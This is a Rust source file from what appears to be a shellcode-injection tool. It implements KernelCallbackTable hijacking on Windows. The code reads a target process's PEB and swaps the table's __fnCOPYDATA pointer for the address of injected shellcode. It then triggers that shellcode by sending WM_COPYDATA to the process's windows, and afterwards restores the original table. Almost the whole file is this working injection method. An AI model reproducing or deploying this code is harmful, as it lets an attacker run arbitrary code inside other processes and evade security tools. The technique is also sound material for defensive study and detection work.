#[allow(unused_variables)]

use std::ffi::c_void;

use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::{LPARAM, WPARAM}, System::{DataExchange::COPYDATASTRUCT, Threading::PROCESS_BASIC_INFORMATION}, UI::WindowsAndMessaging::WM_COPYDATA}};
use crate::{utils::to_wide, wrappers::{HandleWrapper as _, RemoteAllocator as _, RemoteProcess}};

use super::ExecutionMethod;

#[repr(C)]
pub struct PebPartial {
    _reserved: [u8; 0x58], // 88 bytes of padding
    pub kernel_callback_table: *mut c_void,
}

#[allow(non_snake_case)]
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct KernelCallbackTable {
    pub __fnCOPYDATA: usize,
    pub __fnCOPYGLOBALDATA: usize,
    pub __fnDWORD: usize,
    pub __fnNCDESTROY: usize,
    pub __fnDWORDOPTINLPMSG: usize,
    pub __fnINOUTDRAG: usize,
    pub __fnGETTEXTLENGTHS: usize,
    pub __fnINCNTOUTSTRING: usize,
    pub __fnPOUTLPINT: usize,
    pub __fnINLPCOMPAREITEMSTRUCT: usize,
    pub __fnINLPCREATESTRUCT: usize,
    pub __fnINLPDELETEITEMSTRUCT: usize,
    pub __fnINLPDRAWITEMSTRUCT: usize,
    pub __fnPOPTINLPUINT: usize,
    pub __fnPOPTINLPUINT2: usize,
    pub __fnINLPMDICREATESTRUCT: usize,
    pub __fnINOUTLPMEASUREITEMSTRUCT: usize,
    pub __fnINLPWINDOWPOS: usize,
    pub __fnINOUTLPPOINT5: usize,
    pub __fnINOUTLPSCROLLINFO: usize,
    pub __fnINOUTLPRECT: usize,
    pub __fnINOUTNCCALCSIZE: usize,
    pub __fnINOUTLPPOINT5_: usize,
    pub __fnINPAINTCLIPBRD: usize,
    pub __fnINSIZECLIPBRD: usize,
    pub __fnINDESTROYCLIPBRD: usize,
    pub __fnINSTRING: usize,
    pub __fnINSTRINGNULL: usize,
    pub __fnINDEVICECHANGE: usize,
    pub __fnPOWERBROADCAST: usize,
    pub __fnINLPUAHDRAWMENU: usize,
    pub __fnOPTOUTLPDWORDOPTOUTLPDWORD: usize,
    pub __fnOPTOUTLPDWORDOPTOUTLPDWORD_: usize,
    pub __fnOUTDWORDINDWORD: usize,
    pub __fnOUTLPRECT: usize,
    pub __fnOUTSTRING: usize,
    pub __fnPOPTINLPUINT3: usize,
    pub __fnPOUTLPINT2: usize,
    pub __fnSENTDDEMSG: usize,
    pub __fnINOUTSTYLECHANGE: usize,
    pub __fnHkINDWORD: usize,
    pub __fnHkINLPCBTACTIVATESTRUCT: usize,
    pub __fnHkINLPCBTCREATESTRUCT: usize,
    pub __fnHkINLPDEBUGHOOKSTRUCT: usize,
    pub __fnHkINLPMOUSEHOOKSTRUCTEX: usize,
    pub __fnHkINLPKBDLLHOOKSTRUCT: usize,
    pub __fnHkINLPMSLLHOOKSTRUCT: usize,
    pub __fnHkINLPMSG: usize,
    pub __fnHkINLPRECT: usize,
    pub __fnHkOPTINLPEVENTMSG: usize,
    pub __xxxClientCallDelegateThread: usize,
    pub __ClientCallDummyCallback: usize,
    pub __fnKEYBOARDCORRECTIONCALLOUT: usize,
    pub __fnOUTLPCOMBOBOXINFO: usize,
    pub __fnINLPCOMPAREITEMSTRUCT2: usize,
    pub __xxxClientCallDevCallbackCapture: usize,
    pub __xxxClientCallDitThread: usize,
    pub __xxxClientEnableMMCSS: usize,
    pub __xxxClientUpdateDpi: usize,
    pub __xxxClientExpandStringW: usize,
    pub __ClientCopyDDEIn1: usize,
    pub __ClientCopyDDEIn2: usize,
    pub __ClientCopyDDEOut1: usize,
    pub __ClientCopyDDEOut2: usize,
    pub __ClientCopyImage: usize,
    pub __ClientEventCallback: usize,
    pub __ClientFindMnemChar: usize,
    pub __ClientFreeDDEHandle: usize,
    pub __ClientFreeLibrary: usize,
    pub __ClientGetCharsetInfo: usize,
    pub __ClientGetDDEFlags: usize,
    pub __ClientGetDDEHookData: usize,
    pub __ClientGetListboxString: usize,
    pub __ClientGetMessageMPH: usize,
    pub __ClientLoadImage: usize,
    pub __ClientLoadLibrary: usize,
    pub __ClientLoadMenu: usize,
    pub __ClientLoadLocalT1Fonts: usize,
    pub __ClientPSMTextOut: usize,
    pub __ClientLpkDrawTextEx: usize,
    pub __ClientExtTextOutW: usize,
    pub __ClientGetTextExtentPointW: usize,
    pub __ClientCharToWchar: usize,
    pub __ClientAddFontResourceW: usize,
    pub __ClientThreadSetup: usize,
    pub __ClientDeliverUserApc: usize,
    pub __ClientNoMemoryPopup: usize,
    pub __ClientMonitorEnumProc: usize,
    pub __ClientCallWinEventProc: usize,
    pub __ClientWaitMessageExMPH: usize,
    pub __ClientWOWGetProcModule: usize,
    pub __ClientWOWTask16SchedNotify: usize,
    pub __ClientImmLoadLayout: usize,
    pub __ClientImmProcessKey: usize,
    pub __fnIMECONTROL: usize,
    pub __fnINWPARAMDBCSCHAR: usize,
    pub __fnGETTEXTLENGTHS2: usize,
    pub __fnINLPKDRAWSWITCHWND: usize,
    pub __ClientLoadStringW: usize,
    pub __ClientLoadOLE: usize,
    pub __ClientRegisterDragDrop: usize,
    pub __ClientRevokeDragDrop: usize,
    pub __fnINOUTMENUGETOBJECT: usize,
    pub __ClientPrinterThunk: usize,
    pub __fnOUTLPCOMBOBOXINFO2: usize,
    pub __fnOUTLPSCROLLBARINFO: usize,
    pub __fnINLPUAHDRAWMENU2: usize,
    pub __fnINLPUAHDRAWMENUITEM: usize,
    pub __fnINLPUAHDRAWMENU3: usize,
    pub __fnINOUTLPUAHMEASUREMENUITEM: usize,
    pub __fnINLPUAHDRAWMENU4: usize,
    pub __fnOUTLPTITLEBARINFOEX: usize,
    pub __fnTOUCH: usize,
    pub __fnGESTURE: usize,
    pub __fnPOPTINLPUINT4: usize,
    pub __fnPOPTINLPUINT5: usize,
    pub __xxxClientCallDefaultInputHandler: usize,
    pub __fnEMPTY: usize,
    pub __ClientRimDevCallback: usize,
    pub __xxxClientCallMinTouchHitTestingCallback: usize,
    pub __ClientCallLocalMouseHooks: usize,
    pub __xxxClientBroadcastThemeChange: usize,
    pub __xxxClientCallDevCallbackSimple: usize,
    pub __xxxClientAllocWindowClassExtraBytes: usize,
    pub __xxxClientFreeWindowClassExtraBytes: usize,
    pub __fnGETWINDOWDATA: usize,
    pub __fnINOUTSTYLECHANGE2: usize,
    pub __fnHkINLPMOUSEHOOKSTRUCTEX2: usize,
}

pub struct KernelCallbackTableExecutor;

impl ExecutionMethod for KernelCallbackTableExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;

        println!("PEB address: {:?}", pbi.PebBaseAddress);
        let peb = remote_process.read_memory(pbi.PebBaseAddress as *const c_void, std::mem::size_of::<PebPartial>())?;
        let mut peb = unsafe { std::ptr::read(peb.as_ptr() as *const PebPartial) };

        println!("KernelCallbackTable address: {:?}", peb.kernel_callback_table);

        let kct_addr = peb.kernel_callback_table;
        let kct = remote_process.read_memory(kct_addr, std::mem::size_of::<KernelCallbackTable>())?;
        let mut kct = unsafe { std::ptr::read(kct.as_ptr() as *const KernelCallbackTable) };

        println!("KernelCallbackTable: {:?}", kct);

        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;

        kct.__fnCOPYDATA = shellcode_mem as usize;
        let newkct_addr = remote_process.alloc(std::mem::size_of::<KernelCallbackTable>(), true)?;
        remote_process.write(newkct_addr, unsafe {
            std::slice::from_raw_parts(
                &kct as *const KernelCallbackTable as *const u8,
                std::mem::size_of::<KernelCallbackTable>(),
            )
        })?;

        peb.kernel_callback_table = newkct_addr;
        remote_process.write(pbi.PebBaseAddress as *mut c_void, unsafe {
            std::slice::from_raw_parts(
                &peb as *const PebPartial as *const u8,
                std::mem::size_of::<PebPartial>(),
            )
        })?;

        println!("Triggering shellcode via WM_COPYDATA");

        let windows = remote_process.get_windows()?;
        let msg = to_wide("Pwn"); // todo: probably can be empty
        let cds = COPYDATASTRUCT {
            dwData: 1,
            cbData: (msg.len() * 2) as u32,
            lpData: msg.as_ptr() as *mut c_void,
        };

        println!("Sending WM_COPYDATA to {} windows", windows.len());

        for window in &windows {
            window.send_msg(WM_COPYDATA, Some(WPARAM(window.handle().0 as usize)), Some(LPARAM(&cds as *const _ as isize)));
            std::thread::sleep(std::time::Duration::from_millis(10));
        }

        println!("Restoring previous __fnCOPYDATA");

        peb.kernel_callback_table = kct_addr;
        remote_process.write(pbi.PebBaseAddress as *mut c_void, unsafe {
            std::slice::from_raw_parts(
                &peb as *const PebPartial as *const u8,
                std::mem::size_of::<PebPartial>(),
            )
        })?;

        println!("Restored previous __fnCOPYDATA");

        Ok(())
    }
}